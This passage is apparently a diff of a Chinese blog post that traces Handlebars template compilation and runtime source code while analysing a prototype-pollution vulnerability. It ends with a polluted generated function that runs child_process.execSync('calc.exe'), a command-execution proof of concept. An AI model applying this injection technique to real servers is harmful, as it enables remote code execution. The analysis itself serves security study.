language_">this</span>.<span class="title function_">lookupPropertyFunctionVarDeclaration</span>(), <span class="string">&#x27;;\n&#x27;</span>]);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">push</span>(<span class="string">&#x27;return fn;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (asObject) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span> = <span class="title class_">Function</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, [<span class="string">&#x27;fn&#x27;</span>, <span class="string">&#x27;props&#x27;</span>, <span class="string">&#x27;container&#x27;</span>, <span class="string">&#x27;depth0&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;blockParams&#x27;</span>, <span class="string">&#x27;depths&#x27;</span>, <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">merge</span>()]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">prepend</span>(<span class="string">&#x27;function(fn, props, container, depth0, data, blockParams, depths) &#123;\n&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">push</span>(<span class="string">&#x27;&#125;\n&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">decorators</span> = <span class="variable language_">this</span>.<span class="property">decorators</span>.<span class="title function_">merge</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">decorators</span> = <span class="literal">undefined</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> fn = <span class="variable language_">this</span>.<span class="title function_">createFunctionContext</span>(asObject); <span class="comment">// 创建模板的函数体</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isChild</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> ret = &#123;</span><br><span class="line">        <span class="attr">compiler</span>: <span class="variable language_">this</span>.<span class="title function_">compilerInfo</span>(),</span><br><span class="line">        <span class="attr">main</span>: fn</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">decorators</span>) &#123;</span><br><span class="line">        ret.<span class="property">main_d</span> = <span class="variable language_">this</span>.<span class="property">decorators</span>; <span class="comment">// eslint-disable-line camelcase</span></span><br><span class="line">        ret.<span class="property">useDecorators</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> _context = <span class="variable language_">this</span>.<span class="property">context</span>;</span><br><span class="line">      <span class="keyword">var</span> programs = _context.<span class="property">programs</span>;</span><br><span class="line">      <span class="keyword">var</span> decorators = _context.<span class="property">decorators</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>, l = programs.<span class="property">length</span>; i &lt; l; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (programs[i]) &#123;</span><br><span class="line">          ret[i] = programs[i];</span><br><span class="line">          <span class="keyword">if</span> (decorators[i]) &#123;</span><br><span class="line">            ret[i + <span class="string">&#x27;_d&#x27;</span>] = decorators[i];</span><br><span class="line">            ret.<span class="property">useDecorators</span> = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">usePartial</span>) &#123;</span><br><span class="line">        ret.<span class="property">usePartial</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        ret.<span class="property">useData</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useDepths</span>) &#123;</span><br><span class="line">        ret.<span class="property">useDepths</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useBlockParams</span>) &#123;</span><br><span class="line">        ret.<span class="property">useBlockParams</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">compat</span>) &#123;</span><br><span class="line">        ret.<span class="property">compat</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!asObject) &#123;</span><br><span class="line">        ret.<span class="property">compiler</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(ret.<span class="property">compiler</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span> = &#123; <span class="attr">start</span>: &#123; <span class="attr">line</span>: <span class="number">1</span>, <span class="attr">column</span>: <span class="number">0</span> &#125; &#125;;</span><br><span class="line">        ret = <span class="variable language_">this</span>.<span class="title function_">objectLiteral</span>(ret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (options.<span class="property">srcName</span>) &#123;</span><br><span class="line">          ret = ret.<span class="title function_">toStringWithSourceMap</span>(&#123; <span class="attr">file</span>: options.<span class="property">destName</span> &#125;);</span><br><span class="line">          ret.<span class="property">map</span> = ret.<span class="property">map</span> &amp;&amp; ret.<span class="property">map</span>.<span class="title function_">toString</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          ret = ret.<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ret.<span class="property">compilerOptions</span> = <span class="variable language_">this</span>.<span class="property">options</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  compile: function compile(environment, options, context, asObject) &#123;
-    this.environment = environment;
-    this.options = options;
-    this.stringParams = this.options.stringParams;
-    this.trackIds = this.options.trackIds;
-    this.precompile = !asObject;
-
-    this.name = this.environment.name;
-    this.isChild = !!context;
-    this.context = context || &#123;
-      decorators: [],
-      programs: [],
-      environments: []
-    &#125;;
-
-    this.preamble();
-
-    this.stackSlot = 0;
-    this.stackVars = [];
-    this.aliases = &#123;&#125;;
-    this.registers = &#123; list: [] &#125;;
-    this.hashes = [];
-    this.compileStack = [];
-    this.inlineStack = [];
-    this.blockParams = [];
-
-    this.compileChildren(environment, options);
-
-    this.useDepths = this.useDepths || environment.useDepths || environment.useDecorators || this.options.compat;
-    this.useBlockParams = this.useBlockParams || environment.useBlockParams;
-
-    var opcodes = environment.opcodes,
-        opcode = undefined,
-        firstLoc = undefined,
-        i = undefined,
-        l = undefined;
-
-    for (i = 0, l = opcodes.length; i &lt; l; i++) &#123;
-      opcode = opcodes[i];
-
-      this.source.currentLocation = opcode.loc;
-      firstLoc = firstLoc || opcode.loc;
-      this[opcode.opcode].apply(this, opcode.args); // 这里就是使用我们opcode的操作，然后会把结果存到this.source.SourceNode中
-    &#125;
-
-    // Flush any trailing content that might be pending.
-    this.source.currentLocation = firstLoc;
-    this.pushSource(&#39;&#39;);
-
-    /* istanbul ignore next */
-    if (this.stackSlot || this.inlineStack.length || this.compileStack.length) &#123;
-      throw new _exception2[&#39;default&#39;](&#39;Compile completed with content left on stack&#39;);
-    &#125;
-
-    if (!this.decorators.isEmpty()) &#123;
-      this.useDecorators = true;
-
-      this.decorators.prepend([&#39;var decorators = container.decorators, &#39;, this.lookupPropertyFunctionVarDeclaration(), &#39;;\n&#39;]);
-      this.decorators.push(&#39;return fn;&#39;);
-
-      if (asObject) &#123;
-        this.decorators = Function.apply(this, [&#39;fn&#39;, &#39;props&#39;, &#39;container&#39;, &#39;depth0&#39;, &#39;data&#39;, &#39;blockParams&#39;, &#39;depths&#39;, this.decorators.merge()]);
-      &#125; else &#123;
-        this.decorators.prepend(&#39;function(fn, props, container, depth0, data, blockParams, depths) &#123;\n&#39;);
-        this.decorators.push(&#39;&#125;\n&#39;);
-        this.decorators = this.decorators.merge();
-      &#125;
-    &#125; else &#123;
-      this.decorators = undefined;
-    &#125;
-
-    var fn = this.createFunctionContext(asObject); // 创建模板的函数体
-    if (!this.isChild) &#123;
-      var ret = &#123;
-        compiler: this.compilerInfo(),
-        main: fn
-      &#125;;
-
-      if (this.decorators) &#123;
-        ret.main_d = this.decorators; // eslint-disable-line camelcase
-        ret.useDecorators = true;
-      &#125;
-
-      var _context = this.context;
-      var programs = _context.programs;
-      var decorators = _context.decorators;
-
-      for (i = 0, l = programs.length; i &lt; l; i++) &#123;
-        if (programs[i]) &#123;
-          ret[i] = programs[i];
-          if (decorators[i]) &#123;
-            ret[i + &#39;_d&#39;] = decorators[i];
-            ret.useDecorators = true;
-          &#125;
-        &#125;
-      &#125;
-
-      if (this.environment.usePartial) &#123;
-        ret.usePartial = true;
-      &#125;
-      if (this.options.data) &#123;
-        ret.useData = true;
-      &#125;
-      if (this.useDepths) &#123;
-        ret.useDepths = true;
-      &#125;
-      if (this.useBlockParams) &#123;
-        ret.useBlockParams = true;
-      &#125;
-      if (this.options.compat) &#123;
-        ret.compat = true;
-      &#125;
-
-      if (!asObject) &#123;
-        ret.compiler = JSON.stringify(ret.compiler);
-
-        this.source.currentLocation = &#123; start: &#123; line: 1, column: 0 &#125; &#125;;
-        ret = this.objectLiteral(ret);
-
-        if (options.srcName) &#123;
-          ret = ret.toStringWithSourceMap(&#123; file: options.destName &#125;);
-          ret.map = ret.map &amp;&amp; ret.map.toString();
-        &#125; else &#123;
-          ret = ret.toString();
-        &#125;
-      &#125; else &#123;
-        ret.compilerOptions = this.options;
-      &#125;
-
-      return ret;
-    &#125; else &#123;
-      return fn;
-    &#125;
-  &#125;,</code></pre>
 <p>执行<code>opcode</code>中<code>pushLiteral</code>的具体实现流程</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">// [pushLiteral]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// On stack, before: ...</span></span><br><span class="line">  <span class="comment">// On stack, after: value, ...</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Pushes a value onto the stack. This operation prevents</span></span><br><span class="line">  <span class="comment">// the compiler from creating a temporary variable to hold</span></span><br><span class="line">  <span class="comment">// it.  </span></span><br><span class="line">  <span class="attr">pushLiteral</span>: <span class="keyword">function</span> <span class="title function_">pushLiteral</span>(<span class="params">value</span>) &#123; <span class="comment">// 注释也已经很清楚了</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pushStackLiteral</span>(value); </span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="attr">pushStackLiteral</span>: <span class="keyword">function</span> <span class="title function_">pushStackLiteral</span>(<span class="params">item</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Literal</span>(item));</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Literal</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  	<span class="variable language_">this</span>.<span class="property">value</span> = value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="attr">push</span>: <span class="keyword">function</span> <span class="title function_">push</span>(<span class="params">expr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(expr <span class="keyword">instanceof</span> <span class="title class_">Literal</span>)) &#123;</span><br><span class="line">      expr = <span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">wrap</span>(expr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">inlineStack</span>.<span class="title function_">push</span>(expr);</span><br><span class="line">    <span class="keyword">return</span> expr;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-
-  // [pushLiteral]
-  //
-  // On stack, before: ...
-  // On stack, after: value, ...
-  //
-  // Pushes a value onto the stack. This operation prevents
-  // the compiler from creating a temporary variable to hold
-  // it.  
-  pushLiteral: function pushLiteral(value) &#123; // 注释也已经很清楚了
-    this.pushStackLiteral(value); 
-  &#125;,
-
-  pushStackLiteral: function pushStackLiteral(item) &#123;
-    this.push(new Literal(item));
-  &#125;,
-
-  function Literal(value) &#123;
-      this.value = value;
-  &#125;
-
-  push: function push(expr) &#123;
-    if (!(expr instanceof Literal)) &#123;
-      expr = this.source.wrap(expr);
-    &#125;
-
-    this.inlineStack.push(expr);
-    return expr;
-  &#125;,</code></pre>
 <p>在执行最后的<code>append</code>操作的时候会将<code>inlineStack</code>中的内容pop出来加入到<code>Source</code>中</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">append</span>: <span class="keyword">function</span> <span class="title function_">append</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="title function_">isInline</span>()) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">replaceStack</span>(<span class="keyword">function</span> (<span class="params">current</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27; != null ? &#x27;</span>, current, <span class="string">&#x27; : &quot;&quot;&#x27;</span>];</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">pushSource</span>(<span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(<span class="variable language_">this</span>.<span class="title function_">popStack</span>()));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> local = <span class="variable language_">this</span>.<span class="title function_">popStack</span>();</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">pushSource</span>([<span class="string">&#x27;if (&#x27;</span>, local, <span class="string">&#x27; != null) &#123; &#x27;</span>, <span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(local, <span class="literal">undefined</span>, <span class="literal">true</span>), <span class="string">&#x27; &#125;&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">isSimple</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">pushSource</span>([<span class="string">&#x27;else &#123; &#x27;</span>, <span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(<span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="literal">undefined</span>, <span class="literal">true</span>), <span class="string">&#x27; &#125;&#x27;</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  append: function append() &#123;
-    if (this.isInline()) &#123;
-      this.replaceStack(function (current) &#123;
-        return [&#39; != null ? &#39;, current, &#39; : &quot;&quot;&#39;];
-      &#125;);
-
-      this.pushSource(this.appendToBuffer(this.popStack()));
-    &#125; else &#123;
-      var local = this.popStack();
-      this.pushSource([&#39;if (&#39;, local, &#39; != null) &#123; &#39;, this.appendToBuffer(local, undefined, true), &#39; &#125;&#39;]);
-      if (this.environment.isSimple) &#123;
-        this.pushSource([&#39;else &#123; &#39;, this.appendToBuffer(&quot;&#39;&#39;&quot;, undefined, true), &#39; &#125;&#39;]);
-      &#125;
-    &#125;
-  &#125;,</code></pre>
 <p>这里是创建函数体上下文，将<code>source</code>中的东西转换成字符串函数</p>
-<pre><code class="js">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\javascript-compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">createFunctionContext</span>: <span class="keyword">function</span> <span class="title function_">createFunctionContext</span>(<span class="params">asObject</span>) &#123;</span><br><span class="line">    <span class="comment">// istanbul ignore next</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> _this = <span class="variable language_">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> varDeclarations = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> locals = <span class="variable language_">this</span>.<span class="property">stackVars</span>.<span class="title function_">concat</span>(<span class="variable language_">this</span>.<span class="property">registers</span>.<span class="property">list</span>);</span><br><span class="line">    <span class="keyword">if</span> (locals.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      varDeclarations += <span class="string">&#x27;, &#x27;</span> + locals.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate minimizer alias mappings</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// When using true SourceNodes, this will update all references to the given alias</span></span><br><span class="line">    <span class="comment">// as the source nodes are reused in situ. For the non-source node compilation mode,</span></span><br><span class="line">    <span class="comment">// aliases will not be used, but this case is already being run on the client and</span></span><br><span class="line">    <span class="comment">// we aren&#x27;t concern about minimizing the template size.</span></span><br><span class="line">    <span class="keyword">var</span> aliasCount = <span class="number">0</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="variable language_">this</span>.<span class="property">aliases</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">alias</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> node = _this.<span class="property">aliases</span>[alias];</span><br><span class="line">      <span class="keyword">if</span> (node.<span class="property">children</span> &amp;&amp; node.<span class="property">referenceCount</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        varDeclarations += <span class="string">&#x27;, alias&#x27;</span> + ++aliasCount + <span class="string">&#x27;=&#x27;</span> + alias;</span><br><span class="line">        node.<span class="property">children</span>[<span class="number">0</span>] = <span class="string">&#x27;alias&#x27;</span> + aliasCount;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">lookupPropertyFunctionIsUsed</span>) &#123;</span><br><span class="line">      varDeclarations += <span class="string">&#x27;, &#x27;</span> + <span class="variable language_">this</span>.<span class="title function_">lookupPropertyFunctionVarDeclaration</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> params = [<span class="string">&#x27;container&#x27;</span>, <span class="string">&#x27;depth0&#x27;</span>, <span class="string">&#x27;helpers&#x27;</span>, <span class="string">&#x27;partials&#x27;</span>, <span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useBlockParams</span> || <span class="variable language_">this</span>.<span class="property">useDepths</span>) &#123;</span><br><span class="line">      params.<span class="title function_">push</span>(<span class="string">&#x27;blockParams&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">useDepths</span>) &#123;</span><br><span class="line">      params.<span class="title function_">push</span>(<span class="string">&#x27;depths&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Perform a second pass over the output to merge content when possible</span></span><br><span class="line">    <span class="keyword">var</span> source = <span class="variable language_">this</span>.<span class="title function_">mergeSource</span>(varDeclarations); <span class="comment">// 把原本的source和varDeclarations拼接起来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (asObject) &#123;</span><br><span class="line">      params.<span class="title function_">push</span>(source);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Function</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, params);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">wrap</span>([<span class="string">&#x27;function(&#x27;</span>, params.<span class="title function_">join</span>(<span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;) &#123;\n  &#x27;</span>, source, <span class="string">&#x27;&#125;&#x27;</span>]); <span class="comment">// 将source封装成函数</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>
 
-  createFunctionContext: function createFunctionContext(asObject) &#123;
-    // istanbul ignore next
+<h4 id="生成模板"><a href="#生成模板" class="headerlink" title="生成模板"></a>生成模板</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">compileInput</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ast = env.<span class="title function_">parse</span>(input, options), </span><br><span class="line">        environment = <span class="keyword">new</span> env.<span class="title class_">Compiler</span>().<span class="title function_">compile</span>(ast, options),</span><br><span class="line">        templateSpec = <span class="keyword">new</span> env.<span class="title class_">JavaScriptCompiler</span>().<span class="title function_">compile</span>(environment, options, <span class="literal">undefined</span>, <span class="literal">true</span>); </span><br><span class="line">    <span class="keyword">return</span> env.<span class="title function_">template</span>(templateSpec); <span class="comment">// 生成模板</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-    var _this = this;
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars.runtime.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">create</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> hb = <span class="keyword">new</span> base.<span class="title class_">HandlebarsEnvironment</span>();</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Utils</span>.<span class="title function_">extend</span>(hb, base);</span><br><span class="line">  hb.<span class="property">SafeString</span> = _handlebarsSafeString2[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">  hb.<span class="property">Exception</span> = _handlebarsException2[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">  hb.<span class="property">Utils</span> = <span class="title class_">Utils</span>;</span><br><span class="line">  hb.<span class="property">escapeExpression</span> = <span class="title class_">Utils</span>.<span class="property">escapeExpression</span>;</span><br><span class="line"></span><br><span class="line">  hb.<span class="property">VM</span> = runtime;</span><br><span class="line">  hb.<span class="property">template</span> = <span class="keyword">function</span> (<span class="params">spec</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> runtime.<span class="title function_">template</span>(spec, hb);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-    var varDeclarations = &#39;&#39;;
+<h4 id="模板函数执行"><a href="#模板函数执行" class="headerlink" title="模板函数执行"></a>模板函数执行</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\compiler\compiler.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ret</span>(<span class="params">context, execOptions</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!compiled) &#123;</span><br><span class="line">      compiled = <span class="title function_">compileInput</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> compiled.<span class="title function_">call</span>(<span class="variable language_">this</span>, context, execOptions); <span class="comment">// 执行函数获取返回值</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
 
-    var locals = this.stackVars.concat(this.registers.list);
-    if (locals.length &gt; 0) &#123;
-      varDeclarations += &#39;, &#39; + locals.join(&#39;, &#39;);
-    &#125;
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules\handlebars\dist\cjs\handlebars\runtime.js</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ret</span>(<span class="params">context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> options = <span class="variable language_">arguments</span>.<span class="property">length</span> &lt;= <span class="number">1</span> || <span class="variable language_">arguments</span>[<span class="number">1</span>] === <span class="literal">undefined</span> ? &#123;&#125; : <span class="variable language_">arguments</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data = options.<span class="property">data</span>;</span><br><span class="line"></span><br><span class="line">    ret.<span class="title function_">_setup</span>(options);</span><br><span class="line">    <span class="keyword">if</span> (!options.<span class="property">partial</span> &amp;&amp; templateSpec.<span class="property">useData</span>) &#123;</span><br><span class="line">      data = <span class="title function_">initData</span>(context, data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> depths = <span class="literal">undefined</span>,</span><br><span class="line">        blockParams = templateSpec.<span class="property">useBlockParams</span> ? [] : <span class="literal">undefined</span>;</span><br><span class="line">    <span class="keyword">if</span> (templateSpec.<span class="property">useDepths</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (options.<span class="property">depths</span>) &#123;</span><br><span class="line">        depths = context != options.<span class="property">depths</span>[<span class="number">0</span>] ? [context].<span class="title function_">concat</span>(options.<span class="property">depths</span>) : options.<span class="property">depths</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        depths = [context];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params">context <span class="comment">/*, options*/</span></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span> + templateSpec.<span class="title function_">main</span>(container, context, container.<span class="property">helpers</span>, container.<span class="property">partials</span>, data, blockParams, depths); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    main = <span class="title function_">executeDecorators</span>(templateSpec.<span class="property">main</span>, main, container, options.<span class="property">depths</span> || [], data, blockParams); <span class="comment">// 对main函数进行装饰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">main</span>(context, options); <span class="comment">// 执行main函数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-    // Generate minimizer alias mappings
-    //
-    // When using true SourceNodes, this will update all references to the given alias
-    // as the source nodes are reused in situ. For the non-source node compilation mode,
-    // aliases will not be used, but this case is already being run on the client and
-    // we aren&#39;t concern about minimizing the template size.
-    var aliasCount = 0;
-    Object.keys(this.aliases).forEach(function (alias) &#123;
-      var node = _this.aliases[alias];
-      if (node.children &amp;&amp; node.referenceCount &gt; 1) &#123;
-        varDeclarations += &#39;, alias&#39; + ++aliasCount + &#39;=&#39; + alias;
-        node.children[0] = &#39;alias&#39; + aliasCount;
-      &#125;
-    &#125;);
+<h4 id="被污染的函数"><a href="#被污染的函数" class="headerlink" title="被污染的函数"></a>被污染的函数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">anonymous</span>(<span class="params">container,depth0,helpers,partials,data</span></span><br><span class="line"><span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> stack1, lookupProperty = container.<span class="property">lookupProperty</span> || <span class="keyword">function</span>(<span class="params">parent, propertyName</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(parent, propertyName)) &#123;</span><br><span class="line">          <span class="keyword">return</span> parent[propertyName];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((stack1 = (<span class="title function_">lookupProperty</span>(helpers,<span class="string">&quot;undefined&quot;</span>)||(depth0 &amp;&amp; <span class="title function_">lookupProperty</span>(depth0,<span class="string">&quot;undefined&quot;</span>))||container.<span class="property">hooks</span>.<span class="property">helperMissing</span>).<span class="title function_">call</span>(depth0 != <span class="literal">null</span> ? depth0 : (container.<span class="property">nullContext</span> || &#123;&#125;),<span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;calc.exe&#x27;</span>).<span class="title function_">toString</span>()),&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;undefined&quot;</span>,<span class="string">&quot;hash&quot;</span>:&#123;&#125;,<span class="string">&quot;data&quot;</span>:data,<span class="string">&quot;loc&quot;</span>:&#123;<span class="string">&quot;start&quot;</span>:<span class="number">0</span>,<span class="string">&quot;end&quot;</span>:<span class="number">0</span>&#125;&#125;)) != <span class="literal">null</span> ? stack1 : <span 